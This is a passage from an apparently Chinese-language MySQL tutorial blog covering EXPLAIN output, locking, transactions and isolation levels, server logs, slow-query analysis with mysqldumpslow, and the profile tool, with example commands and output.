<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SHOW</span> INDEXES <span class="token keyword">FROM</span> <span class="token punctuation">[</span>db_name<span class="token punctuation">.</span><span class="token punctuation">]</span>tbl_name<span class="token punctuation">;</span></code></pre>

<h3 id="EXPLAIN-工具"><a href="#EXPLAIN-工具" class="headerlink" title="EXPLAIN 工具"></a>EXPLAIN 工具</h3><p>可以通过 EXPLAIN 来分析索引的有效性，获取查询执行计划信息，用来查看查询优化器如何执行查询。</p>
<p>参考资料： <a target="_blank" rel="noopener" href="https://dev.mysql.com/doc/refman/5.7/en/explain-output.html">https://dev.mysql.com/doc/refman/5.7/en/explain-output.html</a></p>
<p>语法：</p>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql">explain 查询语句</code></pre>

<p>示例：</p>
<p><img data-src="http://img.to2b.cn/blog/ljk/1603201489173.png"></p>
<p><code>explain</code> 输出信息说明：</p>
<table>
<thead>
<tr>
<th>列名</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>id</td>
<td>执行编号，标识 select 所属的行。如果在语句中没子查询或关联查询，只有唯一的 select，每行都将显示 1。否则，内层的 select 语句一般会顺序编号，对应于其在原始语句中的位置</td>
</tr>
<tr>
<td>select_type</td>
<td>- 简单查询：SIMPLE<br>- 复杂查询：PRIMARY（最外面的 SELECT）、DERIVED（用于 FROM 中的子查询）、UNION（UNION 语句的第一个之后的 SELECT 语句）、UNION RESUlT（匿名临时表）、SUBQUERY（简单子查询）</td>
</tr>
<tr>
<td>table</td>
<td>表名</td>
</tr>
<tr>
<td>partitions</td>
<td></td>
</tr>
<tr>
<td>type</td>
<td>关联类型或访问类型，即 MySQL 决定的如何去查询表中的行的方式</td>
</tr>
<tr>
<td>possible_keys</td>
<td>查询可能会用到的索引</td>
</tr>
<tr>
<td>key</td>
<td>显示 mysql 决定采用哪个索引来优化查询</td>
</tr>
<tr>
<td>key_len</td>
<td>显示 mysql 在索引里使用的字节数</td>
</tr>
<tr>
<td>ref</td>
<td>根据索引返回表中匹配某单个值的所有行</td>
</tr>
<tr>
<td>rows</td>
<td>为了找到所需的行而需要读取的行数，估算值，不精确。通过把所有 rows 列值相乘，可粗略估算整个查询会检查的行数</td>
</tr>
<tr>
<td>filtered</td>
<td>按表条件筛选的行的百分比</td>
</tr>
<tr>
<td>Extra</td>
<td>额外信息</td>
</tr>
</tbody></table>
<p><font color=red>重点：</font> type 显示的是访问类型，是较为重要的一个指标，结果值从好到坏依次是：</p>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql">NULL
system
const
eq_ref
ref
fulltext
ref_or_null
index_merge
unique_subquery
index_subquery
range
index
ALL

# 重点掌握以下10种
NULL &gt; system &gt; const &gt; eq_ref &gt; ref &gt; ref_or_null &gt; index_merge &gt; range &gt; index &gt; ALL</code></pre>

<p><img data-src="//img.to2b.cn/blog/ljk/image-20220929145043845.png" alt="explain"></p>
<h2 id="并发控制"><a href="#并发控制" class="headerlink" title="并发控制"></a>并发控制</h2><h3 id="锁机制"><a href="#锁机制" class="headerlink" title="锁机制"></a>锁机制</h3><p><strong>读锁：</strong>共享锁，也称为 S 锁,只读不可写（包括当前事务），多个读互不阻塞<br><strong>写锁：</strong>独占锁，排它锁，也称为 X 锁，写锁会阻塞其它事务（不包括当前事务）的读和写</p>
<p>S 锁和 S 锁是兼容的，X 锁和其它锁都不兼容</p>
<p>锁粒度：</p>
<ul>
<li>表级锁：MyISAM</li>
<li>行级锁：InnodB</li>
</ul>
<p>实现</p>
<ul>
<li>存储引擎：自行实现其锁策略和锁粒度</li>
<li>服务器级：实现了锁，表级锁，用户可显式请求</li>
</ul>
<p>分类：</p>
<ul>
<li>隐式锁：由存储引擎自动施加锁</li>
<li>显式锁：用户手动请求</li>
</ul>
<p>锁策略：在锁粒度及数据安全性寻求的平衡机制</p>
<h3 id="显式使用锁"><a href="#显式使用锁" class="headerlink" title="显式使用锁"></a>显式使用锁</h3><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token comment"># 加锁</span>
<span class="token keyword">LOCK</span> <span class="token keyword">TABLE</span><span class="token punctuation">[</span>S<span class="token punctuation">]</span>
    tbl_name <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token keyword">AS</span><span class="token punctuation">]</span> alias<span class="token punctuation">]</span> lock_type
    <span class="token punctuation">[</span><span class="token punctuation">,</span> tbl_name <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token keyword">AS</span><span class="token punctuation">]</span> alias<span class="token punctuation">]</span> lock_type<span class="token punctuation">]</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
    <span class="token punctuation">[</span>WAIT n<span class="token operator">|</span>NOWAIT<span class="token punctuation">]</span>

lock_type:
    <span class="token keyword">READ</span> <span class="token punctuation">[</span><span class="token keyword">LOCAL</span><span class="token punctuation">]</span>
  <span class="token operator">|</span> <span class="token punctuation">[</span>LOW_PRIORITY<span class="token punctuation">]</span> <span class="token keyword">WRITE</span>
  <span class="token operator">|</span> <span class="token keyword">WRITE</span> CONCURRENT

<span class="token comment"># 解锁</span>
<span class="token keyword">UNLOCK</span> <span class="token keyword">TABLES</span></code></pre>

<p>通常在备份前加全局读锁</p>
<h3 id="事务-Transactions"><a href="#事务-Transactions" class="headerlink" title="事务 Transactions"></a>事务 Transactions</h3><p>事务：一组原子性的 SQL 语句，或一个独立工作单元</p>
<p>事务日志：记录事务信息，实现 undo,redo 等故障恢复功能</p>
<h4 id="事务特性-ACID"><a href="#事务特性-ACID" class="headerlink" title="事务特性 ACID"></a>事务特性 ACID</h4><ul>
<li>A：atomicity 原子性；整个事务中的所有操作要么全部成功执行，要么全部失败后回滚</li>
<li>C：consistency 一致性；数据库总是从一个一致性状态转换为另一个一致性状态</li>
<li>I：Isolation 隔离性；一个事务所做出的操作在提交之前，是不能为其它事务所见；隔离有多种隔离级别，实现并发</li>
<li>D：durability 持久性；一旦事务提交，其所做的修改会永久保存于数据库中</li>
</ul>
<h4 id="事务命令"><a href="#事务命令" class="headerlink" title="事务命令"></a>事务命令</h4><p>显式启动事务：</p>
<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">BEGIN</span>
<span class="token comment"># 或</span>
<span class="token keyword">BEGIN</span> <span class="token keyword">WORK</span>
<span class="token comment"># 或</span>
<span class="token keyword">START</span> <span class="token keyword">TRANSACTION</span></code></pre>

<p>结束事务：</p>
<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token comment">#提交</span>
<span class="token keyword">COMMIT</span>

<span class="token comment">#回滚</span>
<span class="token keyword">ROLLBACK</span></code></pre>

<p>自动提交：</p>
<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">set</span> autocommit<span class="token operator">=</span>&#123;<span class="token number">1</span><span class="token operator">|</span><span class="token number">0</span>&#125;</code></pre>

<p>默认为 1，为 0 时设为非自动提交，建议：显式请求和提交事务，而不要使用“自动提交”功能</p>
<p>事务支持保存点：…</p>
<p>查看事务：</p>
<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token comment">#查看当前正在进行的事务</span>
<span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> INFORMATION_SCHEMA<span class="token punctuation">.</span>INNODB_TRX<span class="token punctuation">;</span>
<span class="token comment">#查看当前锁定的事务</span>
<span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> INFORMATION_SCHEMA<span class="token punctuation">.</span>INNODB_LOCKS<span class="token punctuation">;</span>
<span class="token comment">#查看当前等锁的事务</span>
<span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> INFORMATION_SCHEMA<span class="token punctuation">.</span>INNODB_LOCK_WAITS<span class="token punctuation">;</span></code></pre>

<h3 id="事务隔离级别"><a href="#事务隔离级别" class="headerlink" title="事务隔离级别"></a>事务隔离级别</h3><p>MySQL 支持四种隔离级别，事务隔离级别从上至下更加严格，默认为 REPEATABLE-READ</p>
<table>
<thead>
<tr>
<th></th>
<th>隔离级别</th>
<th>脏读</th>
<th>不可重复读</th>
<th>幻读</th>
<th>加读锁</th>
</tr>
</thead>
<tbody><tr>
<td>READ UNCOMMITTED</td>
<td>读未提交</td>
<td>可以出现</td>
<td>可以出现</td>
<td>可以出现</td>
<td>否</td>
</tr>
<tr>
<td>READ COMMITTED</td>
<td>读提交</td>
<td>不允许出现</td>
<td>可以出现</td>
<td>可以出现</td>
<td>否</td>
</tr>
<tr>
<td>REPEATABLE READ</td>
<td>可重复读</td>
<td>不允许出现</td>
<td>不允许出现</td>
<td>可以出现</td>
<td>否</td>
</tr>
<tr>
<td>SERIALIZABLE</td>
<td>序列化</td>
<td>不允许出现</td>
<td>不允许出现</td>
<td>不允许出现</td>
<td>是</td>
</tr>
</tbody></table>
<p><strong>MVCC 和事务的隔离级别：</strong><br>MVCC（多版本并发控制机制）只在 REPEATABLE READ 和 READ COMMITTED 两个隔离级别下工作。其<br>他两个隔离级别都和 MVCC 不兼容,因为 READ UNCOMMITTED 总是读取最新的数据行，而不是符合当前<br>事务版本的数据行。而 SERIALIZABLE 则会对所有读取的行都加锁</p>
<p><strong>指定事务隔离级别：</strong></p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 变量</span>
SET <span class="token assign-left variable">tx_isolation</span><span class="token operator">=</span><span class="token string">'READ-UNCOMMITTED|READ-COMMITTED|REPEATABLE-READ|SERIALIZABLE'</span>
<span class="token comment"># 选项</span>
<span class="token function">vim</span> /etc/my.cnf
<span class="token punctuation">[</span>mysqld<span class="token punctuation">]</span>
transaction-isolation<span class="token operator">=</span>SERIALIZABLE</code></pre>

<p><strong>死锁：</strong>两个或多个事务在同一资源相互占用，并请求锁定对方占用的资源的状态</p>
<h4 id="什么是脏读和幻读"><a href="#什么是脏读和幻读" class="headerlink" title="什么是脏读和幻读"></a>什么是脏读和幻读</h4><p><strong>脏读</strong><br>脏读是指当一个事务正在访问数据，并且对数据进行了修改。而这种修改还没有提交到数据库中，这时，另外一个事务也访问了这个数据，然后使用了这个数据。</p>
<p>例子： 1.财务将董震的工资从 1000 修改成了 8000（但未提交事务） 2.此时应董震读取自己的工资发现自己的工资变成了 8000，高兴的上蹦下跳 3.接着财务发现操作有误，回滚了事务，此时董震的工资又变成了 1000，此时董震记取的工资 8000 是一个 脏数据<br><strong>幻读</strong><br>幻读是指当事务不是独立执行时发生的一种现象，例如第一个事务对一个表中的数据进行了修改，这种修改涉及到了表中的全部数据行。同时，第二个事务也修改了这个表中的数据，这种修改是向表中插入一行新数据。那么，以后就会发生操作第一个事务的用户发现表中还有没有修改的数据行，就好像发生了幻觉一样。</p>
<p>例子：<br>目前公司员工工资为 1000 的有 10 人</p>
<ol>
<li>事务 1 读取所有的员工工资为 1000 的员工。</li>
<li>2.这时事务 2 向 employee 表插入了一条员工纪录，工资也为 1000</li>
<li>3.事务 1 再次读取所有工资为 1000 的员工，共读取了 11 条记录。</li>
</ol>
<p>解决方法：如果在操作事务完成数据处理之前，任何其它事务都不可以添加新数据。</p>
<h2 id="日志管理"><a href="#日志管理" class="headerlink" title="日志管理"></a>日志管理</h2><p>MySQL 支持丰富的日志</p>
<h3 id="x2F-mysql-history"><a href="#x2F-mysql-history" class="headerlink" title="~&#x2F;.mysql_history"></a>~&#x2F;.mysql_history</h3><p>~&#x2F;.mysql_history 文件记录了所有的操作数据库的命令</p>
<h3 id="事务日志"><a href="#事务日志" class="headerlink" title="事务日志"></a>事务日志</h3><p>transaction log</p>
<p>事务日志的写入类型为“追加”，因此其操作为“顺序 IO”；通常也被称为：预写式日志 write ahead logging</p>
<p>事务日志分类两部分：redo 和 undo</p>
<ul>
<li><p>redo log：实现 WAL（Write Ahead Log)，数据更新前先记录 redo log；</p>
<p>redo 日志存储在 ib_logfile0， ib_logfile1…文件中</p>
</li>
<li><p>undo log：保存与执行的操作相反的操作，用于实现 rollback；</p>
<p>undo 日志和数据存储在一起，都在 ibdata1 或 tbl_name.ibd 文件中，当 DB 写压力比较大的时候，可以设置开启独立的 undo 表空间</p>
</li>
</ul>
<p>相关配置选项：</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">innodb_log_file_size <span class="token number">50331648</span>	<span class="token comment"># 每个日志文件大小</span>
innodb_log_files_in_group <span class="token number">2</span>		<span class="token comment"># 日志组成员个数</span>
innodb_log_group_home_dir ./ 	<span class="token comment"># 事务文件路径</span>
innodb_flush_log_at_trx_commit 	<span class="token comment"># 默认为1</span></code></pre>

<p><code>innodb_flush_log_at_trx_commit=0|1|2</code></p>
<ul>
<li>0：事务提交到 mysql 的日志缓冲区，每秒刷新到磁盘一次，提高性能，但是 mysql 服务崩溃可能会丢失最后一秒的事务</li>
<li>1：默认值，每次提交事务都刷新到磁盘，完全遵守 ACID 特性</li>
<li>2：事务提交到 OS 的缓冲区，每秒刷新到磁盘一次，性能比 0 略差，操作系统崩溃可能丢失最后一秒的事务</li>
</ul>
<p>推荐设置为 2<br>设置为 1，同时 sync-binlog &#x3D; 1，表示最高级别的容错</p>
<h3 id="错误日志"><a href="#错误日志" class="headerlink" title="错误日志"></a>错误日志</h3><ul>
<li>mysqld 启动和关闭过程中输出的事件信息</li>
<li>mysqld 运行中产生的错误信息</li>
<li>event scheduler 运行一个 event 时产生的日志信息</li>
<li>在主从复制架构中的从服务器上启动从服务器线程时产生的信息</li>
</ul>
<p>错误文件路径：</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>mysqld<span class="token punctuation">]</span>
<span class="token assign-left variable">log_error</span><span class="token operator">=</span><span class="token variable">$&#123;data_dir&#125;</span>/mysql-error.log</code></pre>

<p>错误文件记录警告的级别：</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>mysqld<span class="token punctuation">]</span>
log_error_verbosity <span class="token operator">=</span> <span class="token number">1</span> <span class="token operator">|</span> <span class="token number">2</span> <span class="token operator">|</span> <span class="token number">3</span>
<span class="token comment"># 1 错误信息；2  错误信息和告警信息； 3：错误信息、告警信息和通知信息</span></code></pre>

<h3 id="通用日志"><a href="#通用日志" class="headerlink" title="通用日志"></a><a target="_blank" rel="noopener" href="http://c.biancheng.net/view/7780.html">通用日志</a></h3><p>通用日志记录对数据库的通用操作，包括 错误的 SQL 语句，如果数据库的使用非常频繁，通用查询日志将会占用非常大的磁盘空间，对系统性能影响较大。一般情况下，数据管理员可以删除很长时间之前的通用查询日志或关闭此日志，以保证 MySQL 服务器上的硬盘空间。</p>
<p>通用日志可以保存在 file（默认）或 table（mysql.general_log 表）</p>
<p>通用日志相关设置</p>
<pre class="language-ini" data-language="ini"><code class="language-ini"><span class="token comment"># 默认是关闭的</span>
<span class="token key attr-name">general-log</span><span class="token punctuation">=</span><span class="token value attr-value">ON|OFF</span>
<span class="token key attr-name">general-log-file</span><span class="token punctuation">=</span><span class="token value attr-value">HOSTNAME.log</span>
<span class="token key attr-name">log-output</span><span class="token punctuation">=</span><span class="token value attr-value">TABLE | FILE | NONE</span></code></pre>

<h3 id="慢查询日志"><a href="#慢查询日志" class="headerlink" title="慢查询日志"></a>慢查询日志</h3><p>记录执行查询时长超出指定时长的操作</p>
<p>慢查询相关设置选项：</p>
<pre class="language-ini" data-language="ini"><code class="language-ini"><span class="token comment"># 开启或关闭慢查询，支持全局和会话，只有全局设置才会生成慢查询文件</span>
<span class="token key attr-name">slow-query-log</span> <span class="token punctuation">=</span> <span class="token value attr-value">ON|OFF</span>

<span class="token key attr-name">slow-query-log-file</span> <span class="token punctuation">=</span> <span class="token value attr-value">HOSTNAME-slow.log</span>

<span class="token comment"># 慢查询的阀值，单位秒,默认为10s，建议修改为1s</span>
<span class="token key attr-name">long-query-time</span> <span class="token punctuation">=</span> <span class="token value attr-value">N</span>

<span class="token comment"># 记录不使用索引或使用全索引扫描的SQL语句，即使没达到慢查询阀值，默认OFF不记录</span>
<span class="token key attr-name">log-queries-not-using-indexes</span> <span class="token punctuation">=</span> <span class="token value attr-value">ON</span>

<span class="token comment"># 多少次查询才记录，mariadb特有</span>
<span class="token key attr-name">log-slow-rate-limit</span> <span class="token punctuation">=</span> <span class="token value attr-value">1</span></code></pre>

<p>慢查询分析工具 <strong>mysqldumpslow</strong></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">mysqldumpslow <span class="token punctuation">[</span> OPTS<span class="token punctuation">..</span>. <span class="token punctuation">]</span> <span class="token punctuation">[</span> LOGS<span class="token punctuation">..</span>. <span class="token punctuation">]</span></code></pre>

<p>范例：</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>root@4710419222 mysql<span class="token punctuation">]</span><span class="token comment"># mysqldumpslow --help</span>
<span class="token punctuation">[</span>root@4710419222 mysql<span class="token punctuation">]</span><span class="token comment"># mysqldumpslow -s t /data/mysql/mysql-slow.log</span>

Reading mysql slow query log from /data/mysql/mysql-slow.log
Count: <span class="token number">3</span>  <span class="token assign-left variable">Time</span><span class="token operator">=</span><span class="token number">93</span>.62s <span class="token punctuation">(</span>280s<span class="token punctuation">)</span>  <span class="token assign-left variable">Lock</span><span class="token operator">=</span><span class="token number">0</span>.00s <span class="token punctuation">(</span>0s<span class="token punctuation">)</span>  <span class="token assign-left variable">Rows</span><span class="token operator">=</span><span class="token number">927.0</span> <span class="token punctuation">(</span><span class="token number">2781</span><span class="token punctuation">)</span>, 2users@3hosts
  SELECT * FROM <span class="token variable"><span class="token variable">`</span>sp_goods<span class="token variable">`</span></span>

Count: <span class="token number">3</span>  <span class="token assign-left variable">Time</span><span class="token operator">=</span><span class="token number">13</span>.45s <span class="token punctuation">(</span>40s<span class="token punctuation">)</span>  <span class="token assign-left variable">Lock</span><span class="token operator">=</span><span class="token number">0</span>.00s <span class="token punctuation">(</span>0s<span class="token punctuation">)</span>  <span class="token assign-left variable">Rows</span><span class="token operator">=</span><span class="token number">4578.0</span> <span class="token punctuation">(</span><span class="token number">13734</span><span class="token punctuation">)</span>, 2users@3hosts
  SELECT * FROM <span class="token variable"><span class="token variable">`</span>sp_goods_pics<span class="token variable">`</span></span>

Count: <span class="token number">1</span>  <span class="token assign-left variable">Time</span><span class="token operator">=</span><span class="token number">2</span>.63s <span class="token punctuation">(</span>2s<span class="token punctuation">)</span>  <span class="token assign-left variable">Lock</span><span class="token operator">=</span><span class="token number">0</span>.00s <span class="token punctuation">(</span>0s<span class="token punctuation">)</span>  <span class="token assign-left variable">Rows</span><span class="token operator">=</span><span class="token number">3802.0</span> <span class="token punctuation">(</span><span class="token number">3802</span><span class="token punctuation">)</span>, lujinkai<span class="token punctuation">[</span>lujinkai<span class="token punctuation">]</span>@<span class="token punctuation">[</span><span class="token number">124.134</span>.219.24<span class="token punctuation">]</span>
  SELECT * FROM <span class="token variable"><span class="token variable">`</span>sp_attribute<span class="token variable">`</span></span>

Count: <span class="token number">1</span>  <span class="token assign-left variable">Time</span><span class="token operator">=</span><span class="token number">1</span>.28s <span class="token punctuation">(</span>1s<span class="token punctuation">)</span>  <span class="token assign-left variable">Lock</span><span class="token operator">=</span><span class="token number">0</span>.00s <span class="token punctuation">(</span>0s<span class="token punctuation">)</span>  <span class="token assign-left variable">Rows</span><span class="token operator">=</span><span class="token number">1457.0</span> <span class="token punctuation">(</span><span class="token number">1457</span><span class="token punctuation">)</span>, lujinkai<span class="token punctuation">[</span>lujinkai<span class="token punctuation">]</span>@<span class="token punctuation">[</span><span class="token number">124.134</span>.219.24<span class="token punctuation">]</span>
  SELECT * FROM <span class="token variable"><span class="token variable">`</span>sp_category<span class="token variable">`</span></span></code></pre>

<h3 id="profile-工具"><a href="#profile-工具" class="headerlink" title="profile 工具"></a>profile 工具</h3><p>profile 工具可以对一条 SQL 的性能进行分析，开启 profile 功能后，所有查询包括错误的语句都会记录在内。</p>
<pre class="language-ini" data-language="ini"><code class="language-ini"><span class="token section"><span class="token punctuation">[</span><span class="token section-name selector">mysqld</span><span class="token punctuation">]</span></span>
<span class="token comment"># 设置profile可以缓存的SQL语句数量，可以设置0-100，默认15</span>
<span class="token key attr-name">profiling-history-size</span><span class="token punctuation">=</span><span class="token value attr-value">15</span></code></pre>

<p>profile 不能通过设置配置文件的方式自动启动，只能通过设置变量的方式会话启动</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token number">10</span>:13:33<span class="token punctuation">(</span>root@localhost<span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token punctuation">(</span>none<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">></span> <span class="token builtin class-name">set</span> @@profiling<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>	<span class="token comment"># 开启profile</span></code></pre>

<p>set profiling&#x3D;0 或者退出会话自动关闭 profile</p>
<p>范例：</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 1. 查看profile缓存的sql语句</span>
MySQL <span class="token punctuation">[</span>blog<span class="token punctuation">]</span><span class="token operator">></span> show profiles<span class="token punctuation">;</span>
+----------+------------+-----------------------------------+
<span class="token operator">|</span> Query_ID <span class="token operator">|</span> Duration   <span class="token operator">|</span> Query                             <span class="token operator">|</span>
+----------+------------+-----------------------------------+
<span class="token operator">|</span>        <span class="token number">1</span> <span class="token operator">|</span> <span class="token number">0.00195000</span> <span class="token operator">|</span> show variables like <span class="token string">'%profiling%'</span> <span class="token operator">|</span>
<span class="token operator">|</span>        <span class="token number">2</span> <span class="token operator">|</span> <span class="token number">0.00019525</span> <span class="token operator">|</span> SELECT DATABASE<span class="token punctuation">(</span><span class="token punctuation">)</span>                 <span class="token operator">|</span>
<span class="token operator">|</span>        <span class="token number">3</span> <span class="token operator">|</span> <span class="token number">0.00057600</span> <span class="token operator">|</span> show databases                    <span class="token operator">|</span>
<span class="token operator">|</span>        <span class="token number">4</span> <span class="token operator">|</span> <span class="token number">0.00013950</span> <span class="token operator">|</span> SELECT DATABASE<span class="token punctuation">(</span><span class="token punctuation">)</span>                 <span class="token operator">|</span>
<span class="token operator">|</span>        <span class="token number">5</span> <span class="token operator">|</span> <span class="token number">0.00043075</span> <span class="token operator">|</span> show tables                       <span class="token operator">|</span>
<span class="token operator">|</span>        <span class="token number">6</span> <span class="token operator">|</span> <span class="token number">0.00439525</span> <span class="token operator">|</span> <span class="token keyword">select</span> * from no1_user            <span class="token operator">|</span>
<span class="token operator">|</span>        <span class="token number">7</span> <span class="token operator">|</span> <span class="token number">0.00058925</span> <span class="token operator">|</span> show databases                    <span class="token operator">|</span>
<span class="token operator">|</span>        <span class="token number">8</span> <span class="token operator">|</span> <span class="token number">0.00020350</span> <span class="token operator">|</span> SELECT DATABASE<span class="token punctuation">(</span><span class="token punctuation">)</span>                 <span class="token operator">|</span>
<span class="token operator">|</span>        <span class="token number">9</span> <span class="token operator">|</span> <span class="token number">0.00136600</span> <span class="token operator">|</span> show tables                       <span class="token operator">|</span>
<span class="token operator">|</span>       <span class="token number">10</span> <span class="token operator">|</span> <span class="token number">0.00425275</span> <span class="token operator">|</span> <span class="token keyword">select</span> * from typecho_contents    <span class="token operator">|</span>
+----------+------------+-----------------------------------+
<span class="token number">10</span> rows <span class="token keyword">in</span> set, <span class="token number">1</span> warning <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span>

<span class="token comment"># 2. 分析Query_ID=10的sql语句，查看执行这条语句的时间都消耗在了哪里</span>
MySQL <span class="token punctuation">[</span>blog<span class="token punctuation">]</span><span class="token operator">></span> show profile <span class="token keyword">for</span> query <span class="token number">10</span><span class="token punctuation">;</span>
+--------------------------------+----------+
<span class="token operator">|</span> Status                         <span class="token operator">|</span> Duration <span class="token operator">|</span>
+--------------------------------+----------+
<span class="token operator">|</span> starting                       <span class="token operator">|</span> <span class="token number">0.000034</span> <span class="token operator">|</span>
<span class="token operator">|</span> Waiting <span class="token keyword">for</span> query cache lock   <span class="token operator">|</span> <span class="token number">0.000015</span> <span class="token operator">|</span>
<span class="token operator">|</span> starting                       <span class="token operator">|</span> <span class="token number">0.000003</span> <span class="token operator">|</span>
<span class="token operator">|</span> checking query cache <span class="token keyword">for</span> query <span class="token operator">|</span> <span class="token number">0.000056</span> <span class="token operator">|</span>
<span class="token operator">|</span> checking permissions           <span class="token operator">|</span> <span class="token number">0.000010</span> <span class="token operator">|</span>
<span class="token operator">|</span> Opening tables                 <span class="token operator">|</span> <span class="token number">0.002307</span> <span class="token operator">|</span>
<span class="token operator">|</span> init                           <span class="token operator">|</span> <span class="token number">0.000045</span> <span class="token operator">|</span>
<span class="token operator">|</span> System lock                    <span class="token operator">|</span> <span class="token number">0.000013</span> <span class="token operator">|</span>
<span class="token operator">|</span> Waiting <span class="token keyword">for</span> query cache lock   <span class="token operator">|</span> <span class="token number">0.000004</span> <span class="token operator">|</span>
<span class="token operator">|</span> System lock                    <span class="token operator">|</span> <span class="token number">0.000029</span> <span class="token operator">|</span>
<span class="token operator">|</span> optimizing                     <span class="token operator">|</span> <span class="token number">0.000007</span> <span class="token operator">|</span>
<span class="token operator">|</span> statistics                     <span class="token operator">|</span> <span class="token number">0.000019</span> <span class="token operator">|</span>
<span class="token operator">|</span> preparing                      <span class="token operator">|</span> <span class="token number">0.000018</span> <span class="token operator">|</span>
<span class="token operator">|</span> executing                      <span class="token operator">|</span> <span class="token number">0.000004</span> <span class="token operator">|</span>
<span class="token operator">|</span> Sending data                   <span class="token operator">|</span> <span class="token number">0.001413</span> <span class="token operator">|</span>
<span class="token operator">|</span> Waiting <span class="token keyword">for</span> query cache lock   <span class="token operator">|</span> <span class="token number">0.000006</span> <span class="token operator">|</span>
<span class="token operator">|</span> Sending data                   <span class="token operator">|</span> <span class="token number">0.000159</span> <span class="token operator">|</span>
<span class="token operator">|</span> Waiting <span class="token keyword">for</span> query cache lock   <span class="token operator">|</span> <span class="token number">0.000006</span> <span class="token operator">|</span>
<span class="token operator">|</span> Sending data                   <span class="token operator">|</span> <span class="token number">0.000053</span> <span class="token operator">|</span>
<span class="token operator">|</span> end                            <span class="token operator">|</span> <span class="token number">0.000005</span> <span class="token operator">|</span>
<span class="token operator">|</span> query end                      <span class="token operator">|</span> <span class="token number">0.000007</span> <span class="token operator">|</span>
<span class="token operator">|</span> closing tables                 <span class="token operator">|</span> <span class="token number">0.000009</span> <span class="token operator">|</span>
<span class="token operator">|</span> freeing items                  <span class="token operator">|</span> <span class="token number">0.000008</span> <span class="token operator">|</span>
<span class="token operator">|</span> Waiting <span class="token keyword">for</span> query cache lock   <span class="token operator">|</span> <span class="token number">0.000002</span> <span class="token operator">|</span>
<span class="token operator">|</span> freeing items                  <span class="token operator">|</span> <span class="token number">0.000015</span> <span class="token operator">|</span>
<span class="token operator">|</span> Waiting <span class="token keyword">for</span> query cache lock   <span class="token operator">|</span> <span class="token number">0.000002</span> <span class="token operator">|</span>
<span class="token operator">|</span> freeing items                  <span class="token operator">|</span> <span class="token number">0.000002</span> <span class="token operator">|</span>
<span class="token operator">|</span> storing result <span class="token keyword">in</span> query cache  <span class="token operator">|</span> <span class="token number">0.000003</span> <span class="token operator">|</span>
<span class="token operator">|</span> cleaning up                    <span class="token operator">|</span> <span class="token number">0.000003</span> <span class="token operator">|</span>
+--------------------------------+----------+
<span class="token number">29</span> rows <span class="token keyword">in</span> set, <span class="token number">1</span> warning <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span>

<span class="token comment"># 3. 第二步的查询的结果不够细致，显示CPU的耗时情况</span>
MySQL <span class="token punctuation">[</span>blog<span class="token punctuation">]</span><span class="token operator">></span> show profile cpu <span class="token keyword">for</span> query <span class="token number">10</span><span class="token punctuation">;</span>
+--------------------------------+----------+----------+------------+
<span class="token operator">|</span> Status                         <span class="token operator">|</span> Duration <span class="token operator">|</span> CPU_user <span class="token operator">|</span> CPU_system <span class="token operator">|</span>
+--------------------------------+----------+----------+------------+
<span class="token operator">|</span> starting                       <span class="token operator">|</span> <span class="token number">0.000034</span> <span class="token operator">|</span> <span class="token number">0.000018</span> <span class="token operator">|</span>   <span class="token number">0.000016</span> <span class="token operator">|</span>
<span class="token operator">|</span> Waiting <span class="token keyword">for</span> query cache lock   <span class="token operator">|</span> <span class="token number">0.000015</span> <span class="token operator">|</span> <span class="token number">0.000007</span> <span class="token operator">|</span>   <span class="token number">0.000007</span> <span class="token operator">|</span>
<span class="token operator">|</span> starting                       <span class="token operator">|</span> <span class="token number">0.000003</span> <span class="token operator">|</span> <span class="token number">0.000002</span> <span class="token operator">|</span>   <span class="token number">0.000001</span> <span class="token operator">|</span>
<span class="token operator">|</span> checking query cache <span class="token keyword">for</span> query <span class="token operator">|</span> <span class="token number">0.000056</span> <span class="token operator">|</span> <span class="token number">0.000030</span> <span class="token operator">|</span>   <span class="token number">0.000027</span> <span class="token operator">|</span>
<span class="token operator">|</span> checking permissions           <span class="token operator">|</span> <span class="token number">0.000010</span> <span class="token operator">|</span> <span class="token number">0.000005</span> <span class="token operator">|</span>   <span class="token number">0.000004</span> <span class="token operator">|</span>
<span class="token operator">|</span> Opening tables                 <span class="token operator">|</span> <span class="token number">0.002307</span> <span class="token operator">|</span> <span class="token number">0.000243</span> <span class="token operator">|</span>   <span class="token number">0.000216</span> <span class="token operator">|</span>
<span class="token operator">|</span> init                           <span class="token operator">|</span> <span class="token number">0.000045</span> <span class="token operator">|</span> <span class="token number">0.000023</span> <span class="token operator">|</span>   <span class="token number">0.000021</span> <span class="token operator">|</span>
<span class="token operator">|</span> System lock                    <span class="token operator">|</span> <span class="token number">0.000013</span> <span class="token operator">|</span> <span class="token number">0.000007</span> <span class="token operator">|</span>   <span class="token number">0.000006</span> <span class="token operator">|</span>
